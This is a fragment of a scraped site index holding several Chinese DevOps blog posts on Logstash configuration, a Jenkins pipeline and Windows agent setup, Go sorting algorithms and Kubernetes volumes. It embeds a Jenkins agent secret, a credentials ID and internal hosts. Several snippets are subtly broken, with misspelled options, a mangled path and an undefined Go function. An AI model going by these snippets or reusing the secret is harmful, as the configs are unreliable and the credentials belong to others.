\u0026quot;DEBUG\u0026quot;,\r\u0026quot;date\u0026quot; =\u0026gt; \u0026quot;2018-10-04 12:48:56.142\u0026quot;,\r\u0026quot;class\u0026quot; =\u0026gt; \u0026quot;ObjectDaoImpl.java:219\u0026quot;,\r\u0026quot;msg\u0026quot; =\u0026gt; \u0026quot;queryPage with hql:select t.fplxdm,t.fpdm,t.fphm,t.fpcbh,f.ipdz,f.dkh,f.jqbh from ( select '026' as fplxdm,fpdm,fphm,kprq,fpcbh,jqbh from pj_zzspdz_fpmx where kprq\u0026gt;'20180801000000' and jqbh='499099915361' and qmbz='N') t,dj_fwqxx f where t.jqbh=f.jqbh order by t.kprq\u0026quot;\r}\r","permalink":"https://www.oomkill.com/2018/11/elk-collect-java/","summary":"","title":"ELK收集java日志"},{"content":"Logstash通过网络将syslog消息作为事件读取。使用用 UDPSocket, TCPServer 和\nLogStash::Filters::Grok 来实现\n配置示例 input { syslog{\rport =\u0026gt; \u0026quot;514\u0026quot;\r}\r}\r配置客户端，在修改linux主机/etc/rsyslog.conf\n*.* @@host:port\r配置说明 参数 说明 * 类型 * 级别 @ udp @@ tcp host 可为主机名或ip地址 注：收集到的数据，本身就以及是rsyslog格式了，无需再进行grok\n{\r\u0026quot;message\u0026quot; =\u0026gt; \u0026quot;(root) CMD (/bin/echo 1111 \u0026gt;\u0026gt;/root/1.txt)\\n\u0026quot;,\r\u0026quot;@version\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;,\r\u0026quot;@timestamp\u0026quot; =\u0026gt; \u0026quot;2018-10-05T12:13:01.000Z\u0026quot;,\r\u0026quot;host\u0026quot; =\u0026gt; \u0026quot;10.0.0.16\u0026quot;,\r\u0026quot;priority\u0026quot; =\u0026gt; 78,\r\u0026quot;timestamp\u0026quot; =\u0026gt; \u0026quot;Oct 5 20:13:01\u0026quot;,\r\u0026quot;logsource\u0026quot; =\u0026gt; \u0026quot;node02\u0026quot;,\r\u0026quot;program\u0026quot; =\u0026gt; \u0026quot;CROND\u0026quot;,\r\u0026quot;pid\u0026quot; =\u0026gt; \u0026quot;92923\u0026quot;,\r\u0026quot;severity\u0026quot; =\u0026gt; 6,\r\u0026quot;facility\u0026quot; =\u0026gt; 9,\r\u0026quot;facility_label\u0026quot; =\u0026gt; \u0026quot;clock\u0026quot;,\r\u0026quot;severity_label\u0026quot; =\u0026gt; \u0026quot;Informational\u0026quot;\r}\r收集到的数据需要对时间进行格式化\n官方date插件说明：Date filter plugin\nfilter {\rdate {\rmatch =\u0026gt; [\u0026quot;timestamp\u0026quot; , \u0026quot;MMM dd HH:mm:ss\u0026quot;]\rtarget =\u0026gt; \u0026quot;timestamp\u0026quot;\r\u0026quot;timezone\u0026quot; =\u0026gt; \u0026quot;Asia/Shanghai\u0026quot;\r}\r}\r格式化完后的时间如下示例\n{\r\u0026quot;message\u0026quot; =\u0026gt; \u0026quot;(root) CMD (/bin/echo 1111 \u0026gt;\u0026gt;/root/1.txt)\\n\u0026quot;,\r\u0026quot;@version\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;,\r\u0026quot;@timestamp\u0026quot; =\u0026gt; \u0026quot;2018-10-05T12:09:01.000Z\u0026quot;,\r\u0026quot;host\u0026quot; =\u0026gt; \u0026quot;10.0.0.16\u0026quot;,\r\u0026quot;priority\u0026quot; =\u0026gt; 78,\r\u0026quot;timestamp\u0026quot; =\u0026gt; \u0026quot;2018-10-05T12:09:01.000Z\u0026quot;,\r\u0026quot;logsource\u0026quot; =\u0026gt; \u0026quot;node02\u0026quot;,\r\u0026quot;program\u0026quot; =\u0026gt; \u0026quot;CROND\u0026quot;,\r\u0026quot;pid\u0026quot; =\u0026gt; \u0026quot;92825\u0026quot;,\r\u0026quot;severity\u0026quot; =\u0026gt; 6,\r\u0026quot;facility\u0026quot; =\u0026gt; 9,\r\u0026quot;facility_label\u0026quot; =\u0026gt; \u0026quot;clock\u0026quot;,\r\u0026quot;severity_label\u0026quot; =\u0026gt; \u0026quot;Informational\u0026quot;\r}\r说明：此处格式化完后时间与当前时区不符，相差8小时。这里不影响，在kibana中显示的为当前时区\n","permalink":"https://www.oomkill.com/2018/11/collect-syslog/","summary":"","title":"ELK收集syslog"},{"content":"def timestr() { script { return sh(script: 'date +%Y%m%d%H%M%S', returnStdout: true).trim()\r}\r}\rdef dockerImage\rpipeline{\ragent any\renvironment {\rtime = timestr()\rregistry = \u0026quot;xxx.com/payapp-test\u0026quot;\rregistryhub = \u0026quot;txhub.xxx.com\u0026quot;\rappName = \u0026quot;api\u0026quot;\r}\roptions {\rtimeout(time: 1, unit: 'HOURS')\rbuildDiscarder(logRotator(numToKeepStr: '15'))\rdisableConcurrentBuilds()\r}\rstages{\rstage(\u0026quot;Pull Code\u0026quot;){\rsteps{\rgit branch: 'testing', credentialsId: '422fb2c7-4d58-440a-98a4-e242b66f3800', url: 'http://gitlab.fgry45iy.com:90/pay/payGateway.git'\r}\r}\rstage(\u0026quot;Maven Package\u0026quot;){\rsteps{\rwithEnv(['PATH+EXTRA=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/apache-maven-3.6.2/bin:/usr/local/maven/bin:/root/bin']) {\rsh \u0026quot;mvn package\u0026quot;\r}\r}\r}\r// stage('Building Image') {\r// steps{\r// script {\r// dockerImage = docker.build( registry + \u0026quot;/\u0026quot; + appName + \u0026quot;:$BUILD_NUMBER\u0026quot;)\r// }\r// }\r// }\r// stage('Push Images To Registry') {\r// steps {\r// script {\r// dockerImage.push()\r// }\r// }\r// }\r// stage('update') {\r// steps {\r// sh \u0026quot;\u0026quot;\u0026quot;\r// curl -k --cert /root/ca/ca.crt --key /root/ca/ca.key -X PUT -H 'Content-Type: application/yaml' --data \u0026quot;\r// apiVersion: apps/v1\r// kind: Deployment\r// metadata:\r// name: tyapi-api-deploy\r// namespace: pay\r// spec:\r// replicas: 2\r// selector:\r// matchLabels:\r// app: pay-api\r// template:\r// metadata:\r// labels:\r// app: pay-api\r// spec:\r// containers:\r// - name: pay-jv2-api\r// image: txhub.99xyp.com/payapp-test/api:$BUILD_NUMBER\r// ports:\r// - name: payapi\r// containerPort: 8081\r// \u0026quot; https://47.156.81.22:6443/apis/apps/v1/namespaces/pay/deployments/tyapi-api-deploy\r// \u0026quot;\u0026quot;\u0026quot;\r// }\r// }\r}\r// post {\r// cleanup {\r// echo 'I have finished, delete dir'\r// deleteDir()\r// }\r// }\r}\r","permalink":"https://www.oomkill.com/2018/11/jenkins-docker/","summary":"","title":"jenkins pipeline docker方式"},{"content":"1 logstash概述 logstash是基于Jruby语言研发的server/agent结构的日志收集工具，可以在任何一个能产生日志的服务器上部署其agent。agent能同时监控多个产生日志的服务，并把每个服务所产生的日志信息收集并发送给logstash server端。由于收集到的日志信息是分散的，logstash有专门的节点用来将所有的节点收集到的日志信息按时间序列合并在一起形成一个序列，基于这一个序列请求写入并存储在elasticsearch集群中。\nkibana是基于node.js开发的elasticsearch的图形用户接口。它可以将用户的搜索语句发送给ES，有ES完成搜索，并且将结果返回。kibana可以将返回的数据，用非常直观的方式（画图）来做趋势展示的。\nlogstash基于多种数据获取机制，TCP/UDP协议、文件、syslog、windows EventLogs及STDIN等。同时也支持多种数据输出机制。获取到数据后，它支持对数据执行过滤、修改等操作。\nlogstash基于JRuby语言研发，需要运行在JVM虚拟机之上。工作于agent/server模型。\n1.1 logstash工作机制 在每一个产生日志的节点之上部署一个agent，这个agent通常称为shipper。shipper负责收集日志，并且发送给server端。但是在发送给server端时，为了避免server端可能无法应付大量节点同时发来的信息，会在server端和agent端之间放置一个消息队列，通常称之为broker。这个消息队列比较常见的使用redis。各agent将数据发送至broker，logstash服务器会从broker中依次取出日志拿来在本地做过滤、修改等操作。在完修改后将其发送至ES集群。\n对于logstash而言，server端也是插件式的工作的模式，与ES的不同在于，ES的插件是可有可无的。logstash的除核心外的所有功能都是基于插件来完成的。\n1.2 logstash工作流程 logstash的工作模式类似于管道，从指定位置读入数据，而后过滤数据，最后将其输出到指定位置。事实上logstash的工作流程为：input | filter | output。如无需对数据额外处理，filter可省略。\n1.3 logstash插件分类 input plugin：收集数据 codec plugin：编码插件 filter plugin：过滤 output plugin：输出插件 2 logstash安装下载 官网地址：https://www.elastic.co/cn/products../../images/Logstash\n3 logstash的配置使用 /etc../../images/Logstash/conf.d/路径下所有以.conf结尾的文件都被当做配置文件使用。对于logstash的配置文件定义，就是定义插件。从哪得到数据。向哪里输出数据。\n3.1 logstash的基本配置框架 input{\r....\r}\rfilter{\r....\r}\routput{\r....\r}\r简单的\ninput{\rstdin {}\r}\routput { stdout{\rcodec =\u0026gt;rubydebug\r}\r}\r检查配置文件语法是否正确logstash -f /etc../../images/Logstash/conf.d/sample.conf --configtest\n$ logstash -f /etc../../images/Logstash/conf.d/sample.conf hellow owrd\rSettings: Default pipeline workers: 1\rPipeline main started\r{\r\u0026quot;message\u0026quot; =\u0026gt; \u0026quot;hellow owrd\u0026quot;, #←信息的完整内容。logstash的信息是在input → filter → output之间流动的。\r\u0026quot;@version\u0026quot; =\u0026gt; \u0026quot;1\u0026quot;, #←版本号。\r\u0026quot;@timestamp\u0026quot; =\u0026gt; \u0026quot;2018-06-04T15:02:47.912Z\u0026quot;, #←事件发生时的时间戳。\r\u0026quot;host\u0026quot; =\u0026gt; \u0026quot;test\u0026quot; #←时间发生的主机。\r}\r3.2 logstash支持的数据类型 Array：[iteml,item2,\u0026hellip;] Boolean：true,false Bytes Codec：编码器。 Hash: key =\u0026gt;value Number Password： Path：文件系统路径。 String：字符串。 logstash还支持字段引用，使用[]进行引用\n3.3 支持的条件判断 ==，!=，\u0026lt;，\u0026lt;=，\u0026gt;，\u0026gt;= 正则匹配=~ !~ in,not in and,or\n4 Logstash常用的插件 logstash是高度插件化的，主要分为input codec filter output插件：\n4.1 input插件 4.1.1 File 从指定的文件中读取事件流。其工作特性类似于tail -1f，能够将日志文件尾部的一行不断的读取出来。\nlogstash使用FileWatch（ruby gem库）机制来监听文件变化。filewatch是linux内核中提供的一种功能。filewatch库支持以glob方式展开文件名。因此可以监听多个文件。并且可以将每个文件读取的位置及状态信息保存在.sincedb数据库中。即使重启logstash后也不会从头读取文件的。.sincedb记录了每个被监听的文件的inode,major number,minor nubmer,pos。默认情况下位于启动logstash服务的用户家目录下。也可以自行定义位置。另外，file插件还可以自动识别日志的滚动（日志分割）操作。\ninput{\rfile{\rpath =\u0026gt; ['/var/log/messages']\rtype =\u0026gt; \u0026quot;system\u0026quot;\rstart_postition =\u0026gt; \u0026quot;beginning\u0026quot;\r}\r}\routput{\rstdout{\rcodec =\u0026gt; rubydebug\r}\r}\rLogstash file\n4.1.2 UDP logstash支持通过一个简单的协议来读取信息，如UDP、TCP，说明对方只要通过TCP协议发送时间也是支持的。或者哪怕通过syslog收集事件也是可以的。\nlogstash通过UDP协议通过网络连接来读取信息，其唯一必须制定的参数为port，用于指定自己监听的端口，agent可以向服务器端端口发送日志信息。而每个被收集数据的主机使用守护进程向server端发送事件。\ninput{\rudp{\rprot =\u0026gt; 25826\rqueue_size =\u0026gt; 2000 #←队列大小\rworkers =\u0026gt; 2 #←启动的工作线程数来接收发送的事件。\rbuffer_size =\u0026gt; #←接收缓冲区的大小\r}\r}\rUDP插件实现\ncollectd：基于C语言开发的一款高度插件式的主机性能监控程序，以守护进程方式运行，能够收集系统性能相关的各种数据；并且能够基于各种存储机制将收集的结果存储下来。collectd本身所收集到的数据可以通过自身的network插件，将自己在本机所收集到的数据发送至其他主机。\ncollectd在epel源中\nyum install collectd -y\rcollectd的大量.so文件为其模块（插件），每一个模块分别实现每一种相应的功能。其配置文件 /etc/collectd.conf\nHostname \u0026quot;node3.magedu.com\u0026quot;\rLoadPlugin syslog LoadPlugin cpu # cpu性能数据\rLoadPlugin df # 磁盘空间使用情况\rLoadPlugin interface # 网络接口\rLoadPlugin 1oad # 服务器负载\rLoadPlugin memory # 内存\rLoadPlugin network \u0026lt;Plugin network\u0026gt;\r\u0026lt;server \u0026quot;10.0.0.19\u0026quot; \u0026quot;25826\u0026quot;\u0026gt; #10.0.0.19是logstash主机的地址，25826是其监听的udp端口\r\u0026lt;/server\u0026gt;\r\u0026lt;/Plugin\rinput udp {\rport =\u0026gt; \u0026quot;25826\u0026quot;\rcodec =\u0026gt; collectd {}\rtype =\u0026gt; \u0026quot;collectd\u0026quot;\r}\routput{\rstdout{\rcodec =\u0026gt; rubydebug\r}\r}\r4.1.3 redis redis插件主要作用在于从redis中获取数据。它支持redis中的两种方式；支持redis channel（发布频道）以及lists两种方式。logstash从redis读数据，可以基于列表方式进行。也可以基于channel方式进行。也就是说redis可以仅工作在正常模式下，不用启用channel机制，也一样能够使logstash从中获取数据。\n对于logstash而言，一般要求redis版本在2.6.0之后的版本。\n4.2 filter插件 filter插件主要用于将event通过output发出之前对其实现某些处理功能。对所收集到的数据当中，期望能够基于某种特定格式进行拆分、组合、过滤其中某些信息，都可以使用filter插件实现。在过滤前后如果有需要，都可以调用codec插件，事先基于某种形式对消息做编码。将处理过数据存往任何可存储位置，需要用到特定于存储位置的输出插件。logstash有众多filter过滤器。\n4.2.1 grok gork是logstash中最重要的插件之一，主要用于分析并结构化文本数据。从web服务器日志读取的日志事件是遵循同种格式的，如：我们只想统计有多少访问IP，但是获取的是一行信息。为了能够方便随后的统计操作，需要将每读到的任何一行日志实现切好。使得对日志分析能够得以进行。目前是logstash中将非结构化日志数据转化为结构化的可查询数据的不二之选。\n目前支持处理 syslog httpd nginx 等。默认情况下，logstash提供了120种默认grok模式。这些模式定义在patterns目录下，每个模式都有默认的名称。\nrpm -ql logstash|grep \u0026quot;patterns$\u0026quot;;\r4.2.2 gork语法格式 logstash中grok的语法格式是使用%{}括起的一组信息使用:隔开，其中左半段称之为SYNTAX由半段称之为SEMANTIC。其中SYNTAX表示grok模板预定义模式中已有的模式名称，SEMANTIC，匹配到的文本的自定义的标识符。\n%{SYNTAX:SEMANTIC}\r例:\n10.0.0.1 GET /index.html 30 0.23\r%{IP:client_ip} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration}\r10.0.0.1 GET /index.html 30 0.23 { \u0026ldquo;message\u0026rdquo; =\u0026gt; \u0026ldquo;10.0.0.1 GET /index.html 30 0.23\u0026rdquo;, \u0026ldquo;@version\u0026rdquo; =\u0026gt; \u0026ldquo;1\u0026rdquo;, \u0026ldquo;@timestamp\u0026rdquo; =\u0026gt; \u0026ldquo;2018-05-31T10:34:37.150Z\u0026rdquo;, \u0026ldquo;host\u0026rdquo; =\u0026gt; \u0026ldquo;mysql\u0026rdquo;, \u0026ldquo;client_ip\u0026rdquo; =\u0026gt; \u0026ldquo;10.0.0.1\u0026rdquo;, \u0026ldquo;method\u0026rdquo; =\u0026gt; \u0026ldquo;GET\u0026rdquo;, \u0026ldquo;request\u0026rdquo; =\u0026gt; \u0026ldquo;/index.html\u0026rdquo;, \u0026ldquo;bytes\u0026rdquo; =\u0026gt; \u0026ldquo;30\u0026rdquo;, \u0026ldquo;duration\u0026rdquo; =\u0026gt; \u0026ldquo;0.23\u0026rdquo; }\ninput {\rstdin {}\r}\rfilter {\rgrok {\rmatch =\u0026gt; { \u0026quot;message\u0026quot; =\u0026gt; \u0026quot;%{IP:client_ip} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration}\u0026quot; } }\r}\routput {\rstdout { codec =\u0026gt; rubydebug }\r}\r自定义grok模式\ngrok模式是基于正则表达式的模式编写，其元字符与其他用到正则表达式的工具awk\\sed\\grep\\pcre差别不大\nnginx log匹配方式\nNGUSERNAME [a-zA-Z\\.\\@\\-\\+_%]+\rNGUSER %{NGUSERNAME}\rNGINXACCESS %{IPORHOST:clientip} - %{NOTSPACE:remote_user} \\[%{HTTPDATE:timestamp}\\] \\\u0026quot;(?:%{WORD:verb} %{NOTSPACE:request}(?: HTTP/%{NUMBER:httpversion})?|%{DATA:rawrequest})\\\u0026quot; %{NUMBER:response} (?:%{NUMBER:bytes}|-) %{QS:referrer} %{QS:agent} %{NOTSPACE:http_x_forwarded_for}\rLOGSTASH+ELASTICSEARCH+KIBANA处理NGINX访问日志 - CSDN博客\ninput {\rfile {\rpath =\u0026gt; ['/var/log/nginx/access.log']\rtype =\u0026gt; \u0026quot;nginxlog\u0026quot;\rstart_position =\u0026gt; \u0026quot;beginning\u0026quot;\r}\r}\rfilter {\rgrok {\rmatch =\u0026gt; { \u0026quot;message\u0026quot; =\u0026gt; \u0026quot;%{NGINXACCESS}\u0026quot; }\r}\r}\routput {\rstdout\t{\rcodec =\u0026gt; rubydebug\r}\r}\raction 将数据输出到至elasticsearch中后基于什么方式做操作 hosts es主机集群列表。数组 index 存储在es的哪个索引当中\nlogstash在使用redis做输入或输出插件时，有两种数据类型，用来保存logstash输出的数据list channel\nES5.4.0 记录 - CSDN博客\n18-elasticsearch集群健康为黄色 - CSDN博客\ncurl -X PUT 172.16.16.18:9200/gongsufanghua-work_record/_settings -d \u0026lsquo;{ \u0026ldquo;index\u0026rdquo; : { \u0026ldquo;number_of_replicas\u0026rdquo; : 0 } }\u0026rsquo;\nlogstash-input-jdbc同步mysql数据到elasticsearch - 运维学习之路 - SegmentFault 思否\nElasticsearch yellow unassigned_shards 恢复 replicas 节点恢复 - CSDN博客\nlogstash mysql 准实时同步到 elasticsearch - 简书\n5 conditionals 当需要在特定条件下过滤或输出事件。可以使用条件条件判断语句。Logstash中的条件查看和行为与编程语言中的条件相同。条件语句支持if，else if以及else和可以被嵌套。\nconditionals\n5.1 语法 if EXPRESSION {\r...\r} else if EXPRESSION {\r...\r} else {\r...\r}\rlogstash支持以下比较运算符：\n== !=、 \u0026lt; \u0026gt; \u0026lt;= \u0026gt;= regexp：=~!~（检查右边的模式与左边的字符串值） 包含：in not in 布尔运算符是： and or nand xor（异或） 支持的一元运算符是：! 注：条件判断语句不包括数学运算符，如下写法logstash会报错\nif [seg_num]\u0026lt;[total_seg]-1 {\r...\r} 5.2 logstash常用条件判断语句 为了避免多个input的数据提交到Elasticsearch后共存于一个索引中。使用index参数来为每个不同的type建立单独的索引。\ninput{\rfile{\rpath=\u0026gt; \u0026quot;/usr/local/elasticsearch-2.3.2/logs/elasticsearch.log.*\u0026quot;\rtype=\u0026gt; \u0026quot;elasticsearch\u0026quot;\rstart_position=\u0026gt; \u0026quot;beginning\u0026quot;\r}\rfile{\rpath=\u0026gt; \u0026quot;/var/log/secure\u0026quot;\rtype=\u0026gt; \u0026quot;secure\u0026quot;\rstart_position=\u0026gt; \u0026quot;beginning\u0026quot;\r}\r}\routput{\rif [type] == \u0026quot;elasticsearch\u0026quot; { elasticsearch {\rhosts=\u0026gt; [\u0026quot;192.168.44.129:9200\u0026quot;]\rindex=\u0026gt; \u0026quot;elasticsearch-%{+YYYY-MM}\u0026quot;\r}\r}\rif [type] == \u0026quot;secure\u0026quot; { elasticsearch {\rhosts=\u0026gt; [\u0026quot;192.168.44.129:9200\u0026quot;]\rindex=\u0026gt; \u0026quot;secure-%{+YYYY-MM}\u0026quot;\r}\r}\r} 使用in运算符来测试字段是否包含特定字符串，键或（对于列表）元素：\nfilter {\rif [foo] in [foobar] {\rmutate { add_tag =\u0026gt; \u0026quot;field in field\u0026quot; }\r}\rif [foo] in \u0026quot;foo\u0026quot; {\rmutate { add_tag =\u0026gt; \u0026quot;field in string\u0026quot; }\r}\rif \u0026quot;hello\u0026quot; in [greeting] {\rmutate { add_tag =\u0026gt; \u0026quot;string in field\u0026quot; }\r}\rif [foo] in [\u0026quot;hello\u0026quot;, \u0026quot;world\u0026quot;, \u0026quot;foo\u0026quot;] {\rmutate { add_tag =\u0026gt; \u0026quot;field in list\u0026quot; }\r}\rif [missing] in [alsomissing] {\rmutate { add_tag =\u0026gt; \u0026quot;shouldnotexist\u0026quot; }\r}\rif !(\u0026quot;foo\u0026quot; in [\u0026quot;hello\u0026quot;, \u0026quot;world\u0026quot;]) {\rmutate { add_tag =\u0026gt; \u0026quot;shouldexist\u0026quot; }\r}\r} 在单个条件中指定多个表达式：\nif [loglevel] == \u0026quot;ERROR\u0026quot; and [deployment] == \u0026quot;production\u0026quot; {\rpagerduty {\r...\r}\r}\r","permalink":"https://www.oomkill.com/2018/11/logstash/","summary":"","title":"Logstash使用"},{"content":"冒泡排序 图 https://www.cnblogs.com/onepixel/articles/7674659.html\npackage main import ( \u0026quot;fmt\u0026quot; ) func bubbleSort(slice []int) []int { for n := 0; n \u0026lt;= len(slice); n++ { for i := 1; i \u0026lt; len(slice)-n; i++ { if slice[i] \u0026lt; slice[i-1] { slice[i], slice[i-1] = slice[i-1], slice[i] } } } return slice } func main() { var arr = [...]int{99, 51, 41, 2, 31} var rarr = bubble(arr[:]) fmt.Println(rarr) } 比较排序 package main import ( \u0026quot;fmt\u0026quot; ) func selectionSort(slice []int) []int { for n := 0; n \u0026lt;= len(slice); n++ { fmt.Println(slice) fmt.Println(\u0026quot;#####################\u0026quot;) for i := n + 1; i \u0026lt; len(slice); i++ { if slice[n] \u0026gt; slice[i] { slice[n], slice[i] = slice[i], slice[n] fmt.Println(slice) } } fmt.Println(\u0026quot;---------------\u0026quot;) } return slice } func main() { var arr = [...]int{99, 51, 41, 2, 31} var rarr = selectionSort(arr[:]) fmt.Println(rarr) } 插入排序 思路：将数组拆分为一个有序的，一个无序的。初始时下标0永远为有序数组。\n建立循环，从下标1开始到数组的长度，每个都与前一个进行对比，如果比前一个值小，就互相换位，当当前值比上一个值大时，说明当前值之前都是已经排序好的数组。就退出。\n例子：如该数组 [...]int{10, 56, 4, 654, 8, 997}，\n第一次循环时，n=1 i=1 56 \u0026gt; 10 跳出。\n第二次循环时，{10, 56, 4, 654, 8, 997} n=2 i=n=2， 4\u0026lt;56 互换，值为 {10, 4, 56, 654, 8, 997} ，内部循环继续进行，i=1 4\u0026lt;10互换为 [4 10 56 654 8 997] 。内部循环结束，条件为i\u0026lt;0\npackage main import ( \u0026quot;fmt\u0026quot; ) func insertSort(arr []int) { for n := 1; n \u0026lt; len(arr); n++ { for i := n; i \u0026gt; 0; i-- { if arr[i] \u0026gt; arr[i-1] { break } arr[i], arr[i-1] = arr[i-1], arr[i] fmt.Println(arr) } } } func main() { var array = [...]int{10, 56, 4, 654, 8, 997} insertSort(array[:]) fmt.Println(array) } 快速排序 思路：以一个基准数将数组拆分为两个，一边大于这个数，一边小于这个数。从数组第0个开始，首先先记录此基准数的下标和值 {312, 84, 543, 5, 100, 23} ，k=0 v=312。需要传入一个从哪里开始到哪里的位置。这里基准数为第一个，顾循环位置就从0+1开始 循环完之后为 84 84 543 5 100 23\npackage main import ( \u0026quot;fmt\u0026quot; ) func qsort(arr []int, start int, end int) { if start \u0026gt;= end { return } key := start value := arr[start] //记录当前基准值位置 fmt.Println(arr) for n := start + 1; n \u0026lt;= end; n++ { // a[n] \u0026lt; arr[start] if arr[n] \u0026lt; value { arr[key] = arr[n] //就将a[n]挪至arr[key]所在位置 arr[n] = arr[key+1] //a[n]空缺了，将arr[key]向后移动一位 // 理论上现在值为这个 {84, 84, 543, 5, 100, 23} key++ //key的位置改变了1位，key++ //最后在将进位后的arr[key] = 之前保存的value即为 // value=321 {84, 312, 543, 5, 100, 23} //这样完成了替换 } } arr[key] = value fmt.Println(\u0026quot;---------------------------\u0026quot;) //一轮循环后该数组为[84 5 100 23 312 543] //将基准数两边的数进行进行排序 此时 key=3 start=0 左边为 start-key-1 qsort(arr, start, key-1) qsort(arr, key+1, end) //右边为key+1-end } func main() { var array = [...]int{312, 84, 543, 5, 100, 23} qsort(array[:], 0, len(array)-1) fmt.Println(array) } ","permalink":"https://www.oomkill.com/2018/10/go-datasort/","summary":"","title":"Go数组排序算法"},{"content":"Jenkins服务端：centos6.8\n客户端：windows server2012 windows10\n工具：cwRsync\n注：复制为jenkins工作目录到网站目录，无需服务端。\n配置安装slave端 所用的插件：Copy Data To Workspace Plugin\n配置windows节点 \\1. 主界面-\u0026gt;【系统管理】-\u0026gt;【管理节点】-\u0026gt;【新建节点】，进行节点的添加：\n\\2. 输入节点名称，选择【Permanent Agent】。如果添加过slave的话会出现【复制现有节点】操作\n\\3. 配置节点的详细信息\n此处配置需要注意的有以下几个方面\n【# of executors】：建议不要超过CPU核心数，一般不要写特别大。\n【远程工作目录】：master将代码库中的代码复制到slave时，存放的临时目录，如slave的daemon服务也会放在此目录。一个job一个文件夹。\n【用法】：选择【只允许运行绑定到这台机器的Job】，此模式下，Jenkins只会构建哪些分配到这台机器的Job。这允许一个节点专门保留给某种类型的Job。例如，在Jenkins上连续的执行测试，你可以设置执行者数量为1，那么同一时间就只会有一个构建，一个实行者不会阻止其它构建，其它构建会在另外的节点运行。\n【启动方式】：选择【Launch agent via Java Web Start】，以windows服务的方式启动，这个为最好配置的。注意：2.x版本的默认没有这个选项，需要单独开启。\n\\4. 配置slave端并且添加至windows服务\n在点击保存后，在node列表中会存在此列表默认是未连通状态\n点击进入详情页面会提示slave端的安装方法，此处讲解下载文件方式。\n【Launch】：浏览器下载文件方式\n【Run from agent command line】：从远端代理命令运行\n注意：这是java服务，每个slave端必须安装jdk后才可运行。\n\u0026lt;jnlp codebase=\u0026quot;http://10.0.0.11:8080/jenkins/computer/test/\u0026quot; spec=\u0026quot;1.0+\u0026quot;\u0026gt; \u0026lt;information\u0026gt; \u0026lt;title\u0026gt;Agent for test\u0026lt;/title\u0026gt; \u0026lt;vendor\u0026gt;Jenkins project\u0026lt;/vendor\u0026gt; \u0026lt;homepage href=\u0026quot;https://jenkins-ci.org/\u0026quot;/\u0026gt; \u0026lt;/information\u0026gt; \u0026lt;security\u0026gt; \u0026lt;all-permissions/\u0026gt; \u0026lt;/security\u0026gt; \u0026lt;resources\u0026gt;\u0026lt;j2se version=\u0026quot;1.8+\u0026quot;/\u0026gt; \u0026lt;jar href=\u0026quot;http://10.0.0.11:8080/jenkins/jnlpJars/remoting.jar\u0026quot;/\u0026gt; \u0026lt;/resources\u0026gt; \u0026lt;application-desc main-class=\u0026quot;hudson.remoting.jnlp.Main\u0026quot;\u0026gt; \u0026lt;argument\u0026gt;c55442e04b03c2fc721ec718b70646c234b4c79a678ff10ccadc59541dbb843\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;test1\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;-workDir\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;d:\\jenkins\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;-internalDir\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;remoting\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;-url\u0026lt;/argument\u0026gt; \u0026lt;argument\u0026gt;http://10.0.0.11:8080/jenkins/\u0026lt;/argument\u0026gt; \u0026lt;/application-desc\u0026gt;\u0026lt;/jnlp\u0026gt; 注意：每个slave的内容都不一样至。多个slave需要多次下载或修改此内容\n安装出现如下错误的原因，没有权限，使用管理员方式运行。\n这种文件右键没有管理员方式运行的菜单，打开【任务管理器】-\u0026gt;【运行】-\u0026gt;【以管理员方式运行】\n卸载系统服务方式:\nsc delete jenkinsslave-c__jenkins 安装完成后slave设置的远端目录会生成如下文件\n返回master的节点列表里，发现此处已经连接上了。\n新建工程 选择自由构建方式。\n【Restrict where this project can be run】：限制运行此项目的节点为刚才设置node时标签填写的windows。\n下载安装插件后会出现此选项。实测，填写路径没什么卵用。\n此处选择执行windows命令\n注：此处存在以下问题。\n1、此处如果代码库中不存在此文件，或更新后此文件被删除，那么使用xcopy会存在代码库中的文件以删除，而slave node文件夹中的文件还存在。无法清除。解决方法使用rsync –delete 或执行脚本文件进行判断。\n2、如slave node中需要存在代码库中不存在的文件，使用rsync会将需要存在的文件删除。\n3、此处无环境变量，执行命令需要使用全路径，不能存在中文和空格\n$ rsync -avz ./ /cygdrive/c/test1/ --delete --exclude=.svn xcopy /y /e /r ./ /cygdrive/c/test1/ ","permalink":"https://www.oomkill.com/2018/10/jenkins-in-windows/","summary":"","title":"Jenkins在windows平台自动化构建代码"},{"content":"在Kubernetes之上，在节点级提供一个存储卷的方式来持久存储数据的逻辑，这种只具备一定程度上的持久性。为了实现更强大的持久性，应该使用脱离节点而存在的共享存储设备。 为此Kubernetes提供了不同类型的存储卷。\n大多数和数据存储服务相关的应用，和有状态应用几乎都是需要持久存储数据的。容器本身是有生命周期的，为了使容器终结后可以将其删除，或者编排至其他节点上去运行。意味着数据不能存储在容器本地。一旦Pod故障就会触发重构。如果将数据放置在Pod自有的容器内名称空间中，数据随着Pod终结而结束。为了突破Pod生命周期的限制，需要将数据放置在Pod自有文件系统之外的地方。\n存储卷\n对Kubernetes来讲，存储卷不属于容器，而属于Pod。因此，在Kubernetes中同一个Pod内的多个容器可共享访问同一组存储卷。\nPod底部有一个基础容器， ==pause==，但是不会启动。pause是基础架构容器。创建Pod时pause时Pod的根，所有Pod，包括网络命名空间等分配都是分配给pause的。在Pod中运行的容器是pause的网络名称空间的。容器在挂载存储卷时，实际上是复制pause的存储卷。\n因此为了真的实现持久性，存储卷应为宿主机挂载的外部存储设备的存储卷。如果需要实现跨节点持久，一般而言需要使用脱离节点本地的网络存储设备（ceph、glusterfs、nfs）来实现。节点如果需要使用此种存储的话，需要可以驱动相应存储设备才可以（在节点级可以访问相应网络存储设备）。\nk8s之上可使用的存储卷 Kubernetes支持的存储卷类型\nempryDir：只在节点本地使用的，用于做临时目录，或当缓存使用。一旦Pod删除，存储卷一并被删除。empryDir背后关联的宿主机目录可以使宿主机的内存。 hostPath：使宿主机目录与容器建立关联关系。 网络存储 传统的SAN（iSCSI，FC）NAS（常见用法协议 NFS,cifs,http）设备所构建的网络存储设备。 